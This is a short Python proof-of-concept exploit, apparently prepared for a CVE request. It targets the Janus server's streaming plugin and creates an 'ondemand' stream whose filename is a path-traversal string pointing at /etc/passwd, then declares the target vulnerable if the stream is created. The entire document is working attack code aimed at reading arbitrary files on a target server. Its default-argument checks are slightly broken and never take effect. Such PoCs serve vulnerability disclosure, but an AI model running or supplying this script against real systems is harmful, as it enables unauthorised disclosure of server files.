#!/usr/bin/env python3
# PoC: Janus streaming ondemand arbitrary file read (CVE request)
# usage: python3 poc_janus_ondemand.py http://TARGET:8088/janus /tmp/x.alaw/../../etc/passwd
import json, sys, requests
J = sys.argv[1] if len(sys.argv) else 'http://127.0.0.1:8088/janus'
F = sys.argv[2] if len(sys.argv) else '/tmp/x.alaw/../../etc/passwd'
post = lambda o: requests.post(J, json=o, timeout=10).json()
r = post({'janus':'create','transaction':'c1'})
sid = r['data']['id']
print('[+] session', sid)
r = post({'janus':'attach','transaction':'a1','plugin':'janus.plugin.streaming','session_id':sid})
hid = r['data']['id']
print('[+] handle', hid)
body = {'request':'create','id':9201,'type':'ondemand','description':'poc','audio':True,'video':False,'data':False,'filename':F}
r = post({'janus':'message','transaction':'m1','session_id':sid,'handle_id':hid,'body':body})
print('[+] response:', json.dumps(r, ensure_ascii=False))
ok = 'created' in json.dumps(r)
print('[+] RESULT:', 'VULNERABLE, stream created from an arbitrary path' if ok else 'NOT VULNERABLE, request rejected')